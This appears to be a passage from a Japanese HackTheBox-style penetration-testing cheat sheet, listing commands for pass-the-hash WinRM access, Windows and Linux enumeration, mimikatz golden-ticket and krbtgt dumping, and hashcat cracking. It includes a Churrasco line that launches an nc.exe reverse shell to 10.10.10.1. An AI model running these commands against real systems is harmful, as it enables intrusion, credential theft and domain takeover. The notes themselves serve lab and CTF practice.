<h3 id="smbactive-directoryを悪用したリモートアクセス" style="position:relative;"><a href="#smbactive-directory%E3%82%92%E6%82%AA%E7%94%A8%E3%81%97%E3%81%9F%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9" aria-label="smbactive directoryを悪用したリモートアクセス permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SMB、Active Directoryを悪用したリモートアクセス</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># evil-winrm</span>
evil-winrm -i targethost.htb　-u user -p <span class="token string">'password'</span>

<span class="token comment"># Pass The Hashでリモートアクセス(-Hオプションによりパスワード無しで侵入できる)</span>
evil-winrm -i targethost.htb　-u Administrator -H <span class="token string">'NTLM hash'</span></code></pre></div>
<p>参考：<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="nofollow noopener noreferrer">Hackplayers/evil-winrm: The ultimate WinRM shell for hacking/pentesting</a></p>
<p>参考：<a href="https://qiita.com/v_avenger/items/78b323d5e30276a20735" target="_blank" rel="nofollow noopener noreferrer">Evil-WinRMを使ったWindows OS環境のリモート探索 - Qiita</a></p>
<p>参考：<a href="https://atmarkit.itmedia.co.jp/flinux/rensai/linuxtips/193smbclientuse.html" target="_blank" rel="nofollow noopener noreferrer">SambaでほかのLinuxにアクセスするには</a></p>
<h2 id="内部探索windows" style="position:relative;"><a href="#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2windows" aria-label="内部探索windows permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>内部探索(Windows)</h2>
<h3 id="内部探索のポイント" style="position:relative;"><a href="#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88" aria-label="内部探索のポイント permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>内部探索のポイント</h3>
<ul>
<li><code class="language-text">[Environment]::Is64BitProcess</code>で現在稼働しているプロセスのbit数を取得する</li>
<li>
<p>認証情報の探索</p>
<ul>
<li>設定情報が記載されたconfigファイル</li>
<li>認証情報が格納されたデータベースのダンプ</li>
<li>認証情報が平文で書き込まれているアクセスログ</li>
<li>過去の認証情報が記録されたバックアップファイルやシャドウコピー</li>
<li>隠しフォルダ(FTPのdirコマンドでは隠しフォルダは表示されない)</li>
</ul>
</li>
<li>
<p>資格情報のキャプチャ</p>
<ul>
<li><a href="https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856" target="_blank" rel="nofollow noopener noreferrer">プリンタデバイスとのLDAP通信のキャプチャ</a></li>
</ul>
</li>
</ul>
<p>参考：<a href="/hackthebox-windows-optimum#powershell%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3">PowerShellのセッション</a></p>
<h3 id="端末情報の取得" style="position:relative;"><a href="#%E7%AB%AF%E6%9C%AB%E6%83%85%E5%A0%B1%E3%81%AE%E5%8F%96%E5%BE%97" aria-label="端末情報の取得 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>端末情報の取得</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># winPEASは試しておく</span>

<span class="token comment"># 端末の構成情報</span>
systeminfo

<span class="token comment"># スケジュールタスク</span>
schtasks /Query /FO LIST 

<span class="token comment"># サービスの確認</span>
sc query state <span class="token operator">=</span> all

<span class="token comment"># フォルダ探索</span>
<span class="token function">dir</span> <span class="token string">"C:\Program Files"</span>
<span class="token function">dir</span> <span class="token string">"C:\Program Files (x86)"</span>
<span class="token function">dir</span> <span class="token string">"C:\Users"</span></code></pre></div>
<h3 id="windowsエクスプロイトの特定" style="position:relative;"><a href="#windows%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E3%81%AE%E7%89%B9%E5%AE%9A" aria-label="windowsエクスプロイトの特定 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Windowsエクスプロイトの特定</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># windows-exploit-suggesterにsysteminfoを与えて探索(Python2/xlrd==1.1.0が必要)</span>
pip <span class="token function">install</span> <span class="token assign-left variable">xlrd</span><span class="token operator">==</span><span class="token number">1.1</span>.0
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database <span class="token number">2022</span>-06-05-mssb.xls --systeminfo systeminfo.txt</code></pre></div>
<h3 id="windowsユーザ情報セキュリティ特権の探索" style="position:relative;"><a href="#windows%E3%83%A6%E3%83%BC%E3%82%B6%E6%83%85%E5%A0%B1%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E7%89%B9%E6%A8%A9%E3%81%AE%E6%8E%A2%E7%B4%A2" aria-label="windowsユーザ情報セキュリティ特権の探索 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Windowsユーザ情報、セキュリティ特権の探索</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># ユーザ情報</span>
net user
net user Administrator

<span class="token comment"># プロセスのトークンのユーザが保有するセキュリティ特権の一覧</span>
<span class="token function">whoami</span> /priv

<span class="token comment"># ユーザとドメインの確認</span>
lusrmgr.msc</code></pre></div>
<p>参考：[Poc’ing Beyond Domain Admin - Part 1 - \cube0x0](<a href="https://cube0x0.github.io/Pocing-Beyond-DA/" target="_blank" rel="nofollow noopener noreferrer">https://cube0x0.github.io/Pocing-Beyond-DA/</a>)</p>
<h3 id="uacの変更" style="position:relative;"><a href="#uac%E3%81%AE%E5%A4%89%E6%9B%B4" aria-label="uacの変更 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>UACの変更</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">UserAccountControlSettings.exe</code></pre></div>
<h3 id="フォルダ共有フォルダの権限の探索" style="position:relative;"><a href="#%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E5%85%B1%E6%9C%89%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E3%81%AE%E6%A8%A9%E9%99%90%E3%81%AE%E6%8E%A2%E7%B4%A2" aria-label="フォルダ共有フォルダの権限の探索 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>フォルダ、共有フォルダの権限の探索</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">icacls でアクセス許可を確認

<span class="token comment">#I-親コンテナから継承された権限</span>
<span class="token comment">#F-フルアクセス（フルコントロール）</span>
<span class="token comment">#M-権利/アクセスを変更する</span>
<span class="token comment">#OI-オブジェクト継承</span>
<span class="token comment">#IO-継承のみ</span>
<span class="token comment">#CI-コンテナ継承</span>
<span class="token comment">#RX-読み取りと実行</span>
<span class="token comment">#AD-データを追加します（サブディレクトリを追加します）</span>
<span class="token comment">#WD-データの書き込みとファイルの追可</span></code></pre></div>
<h3 id="環境変数の確認" style="position:relative;"><a href="#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%81%AE%E7%A2%BA%E8%AA%8D" aria-label="環境変数の確認 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>環境変数の確認</h3>
<h2 id="特権取得windows" style="position:relative;"><a href="#%E7%89%B9%E6%A8%A9%E5%8F%96%E5%BE%97windows" aria-label="特権取得windows permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>特権取得(Windows)</h2>
<h3 id="mimikatzでkerberos環境を攻撃する" style="position:relative;"><a href="#mimikatz%E3%81%A7kerberos%E7%92%B0%E5%A2%83%E3%82%92%E6%94%BB%E6%92%83%E3%81%99%E3%82%8B" aria-label="mimikatzでkerberos環境を攻撃する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>mimikatzでKerberos環境を攻撃する</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># mimikatz.exe</span>
<span class="token comment"># .kirbiチケットのエクスポート</span>
sekurlsa::tickets /export
<span class="token comment"># チケットの偽装</span>
kerberos::ptt <span class="token operator">&lt;</span>ticket<span class="token operator">></span>

<span class="token comment"># ========================================================</span>
<span class="token comment"># mimikatz.exe</span>
<span class="token comment"># ゴールデンチケットの作成に必要なハッシュとセキュリティ識別子のダンプ</span>
lsadump::lsa /inject /name:krbtgt

<span class="token comment"># ゴールデンチケットを作成してシルバーチケットを作成するためのコマンド</span>
<span class="token comment"># サービスNTLMハッシュをkrbtgtスロットに入れ、サービスアカウントのsidをsidに入れ、idを1103に変更する</span>
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:

<span class="token comment"># mimikatzで指定されたチケットを使用して新しい昇格されたコマンドプロンプトを起動</span>
misc::cmd</code></pre></div>
<ul>
<li>マシンのLSASSメモリからTGTをダンプすることにより、チケットを取得し、偽装することができる。</li>
<li>ドメインのSQLサーバーにアクセスしたいが、現在侵害されているユーザーはそのサーバーにアクセスできないとき、そのサービスをkerberoastingすることで、足がかりを得るためのアクセス可能なサービスアカウントを見つけることができる。次に、サービスハッシュをダンプし、TGTになりすまして、KDCからSQLサービスのサービスチケットを要求し、ドメインのSQLにアクセスできるようにする。</li>
</ul>
<h3 id="ローカル特権昇格ツール" style="position:relative;"><a href="#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E7%89%B9%E6%A8%A9%E6%98%87%E6%A0%BC%E3%83%84%E3%83%BC%E3%83%AB" aria-label="ローカル特権昇格ツール permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ローカル特権昇格ツール</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># ユーザーがSeImpersonateまたはSeAssignPrimaryToken特権を持っている場合、COMサーバを悪用して特権を取得できる場合がある</span>


<span class="token comment"># Victimが古い場合はChurrascoを使う</span>
churrasco.exe -d <span class="token string">"C:\wmpub<span class="token entity" title="\n">\n</span>c.exe -e cmd.exe 10.10.10.1 9999"</span></code></pre></div>
<p>参考：<a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="nofollow noopener noreferrer">GitHub - ohpe/juicy-potato</a></p>
<p>参考：<a href="https://github.com/Re4son/Churrasco" target="_blank" rel="nofollow noopener noreferrer">GitHub - Re4son/Churrasco: Changes for Visual Studio 2013</a></p>
<p>参考：<a href="https://note.com/lacnote/n/nef29b7c6a94f" target="_blank" rel="nofollow noopener noreferrer">getsystemの中身</a></p>
<h2 id="内部探索linux" style="position:relative;"><a href="#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2linux" aria-label="内部探索linux permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>内部探索(Linux)</h2>
<ul>
<li>rootとuserのcrontabを確認する</li>
<li><code class="language-text">sudo -l</code>の出力を確認する</li>
<li>
<p>認証情報の探索</p>
<ul>
<li>設定情報が記載されたconfigファイル</li>
<li>認証情報が格納されたデータベースのダンプ</li>
<li>認証情報が平文で書き込まれているアクセスログ</li>
<li>過去の認証情報が記録されたバックアップファイルやシャドウコピー</li>
</ul>
</li>
<li>
<p>マウントされたフラッシュディスクのデータをサルベージする</p>
<ul>
<li><a href="https://kashiwaba-yuki.com/hackthebox-linux-mirai" target="_blank" rel="nofollow noopener noreferrer">USB メモリからのデータのサルベージ</a></li>
</ul>
</li>
</ul>
<h3 id="便利コマンド" style="position:relative;"><a href="#%E4%BE%BF%E5%88%A9%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89" aria-label="便利コマンド permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>便利コマンド</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># scp</span>
<span class="token comment">## upload</span>
<span class="token function">scp</span> /home/kali/Hacking/Tools/linpeas.sh user@targethost.htb:/home/user

<span class="token comment">## download</span>
<span class="token function">scp</span> user@targethost.htb:/home/user/user.txt ./

<span class="token comment"># ssh</span>
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;pub key>"</span> <span class="token operator">></span> ~/.ssh/authorized_keys

<span class="token comment"># sedによるreplace</span>
<span class="token function">sed</span> -i <span class="token string">'s/&lt;置き換え元の正規表現>/&lt;置き換え後の文字列>/g'</span> Filename.txt</code></pre></div>
<h3 id="linpeasのtips" style="position:relative;"><a href="#linpeas%E3%81%AEtips" aria-label="linpeasのtips permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>linpeasのTips</h3>
<ul>
<li>実行と読み取り</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ ./linpeas.sh -a <span class="token function">tee</span> linpeas.txt
$ <span class="token function">less</span> -r linpeas.txt</code></pre></div>
<ul>
<li>良くチェックする項目</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">- Basic information
  - OSバージョンやUser、Group、Hostname、Writable folder

- System Information
  - カーネルバージョン、環境変数、Datetime、Systam stat、CPU情報など
  - <span class="token punctuation">[</span>Executing Linux Exploit Suggester<span class="token punctuation">]</span><span class="token punctuation">(</span>https://github.com/mzet-/linux-exploit-suggester<span class="token punctuation">)</span>の結果
  - <span class="token punctuation">[</span>Executing Linux Exploit Suggester <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https://github.com/jondonas/linux-exploit-suggester-2<span class="token punctuation">)</span>の結果

- Processes, Cron, Services, Timers <span class="token operator">&amp;</span> Sockets
  - 特にroot権限で動いているプロセスやcronを探してみる
  - Binary processes permissions
  - Cron <span class="token function">jobs</span>
  - Services

- Content of /etc/inetd.conf <span class="token operator">&amp;</span> /etc/xinetd.conf
- Active Ports
- Users Information
  - <span class="token function">sudo</span> -l
  - Superusers
  - All <span class="token function">users</span> <span class="token operator">&amp;</span> <span class="token function">groups</span>
  - Login now
  
- Software Information 
  - Database
  - Webサーバ
  - PHP
  - SSH
  - passwdファイル

- Interesting writable files owned by me or writable by everyone <span class="token punctuation">(</span>not <span class="token keyword">in</span> Home<span class="token punctuation">)</span> <span class="token punctuation">(</span>max <span class="token number">500</span><span class="token punctuation">)</span>
- Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders
- Finding *password* or *credential* files <span class="token keyword">in</span> **</code></pre></div>
<h3 id="端末のディレクトリ探索" style="position:relative;"><a href="#%E7%AB%AF%E6%9C%AB%E3%81%AE%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E6%8E%A2%E7%B4%A2" aria-label="端末のディレクトリ探索 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>端末のディレクトリ探索</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ <span class="token function">ls</span> -la / -R <span class="token function">tee</span> dirlist.txt
$ <span class="token function">less</span> -r dirlist.txt</code></pre></div>
<h2 id="特権取得linux" style="position:relative;"><a href="#%E7%89%B9%E6%A8%A9%E5%8F%96%E5%BE%97linux" aria-label="特権取得linux permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>特権取得(Linux)</h2>
<p>(工事中)</p>
<h2 id="パスワードの解読" style="position:relative;"><a href="#%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%81%AE%E8%A7%A3%E8%AA%AD" aria-label="パスワードの解読 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>パスワードの解読</h2>
<h3 id="hashcatサンプル" style="position:relative;"><a href="#hashcat%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB" aria-label="hashcatサンプル permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Hashcatサンプル</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># 辞書攻撃(bcrypt $2*$, Blowfish (Unix))</span>
hashcat -a <span class="token number">0</span> -m <span class="token number">3200</span> ./hash.txt /usr/share/wordlists/rockyou.txt

<span class="token comment"># マスクありブルートフォース(PKZIP (Uncompressed))</span>
hashcat -m <span class="token number">17210</span> -a <span class="token number">3</span> ./hash.txt -1 ?l?u -2 012 -3 0123 -4 0123456789 ?1?1?1?s2021?2?4?3?4?s</code></pre></div>
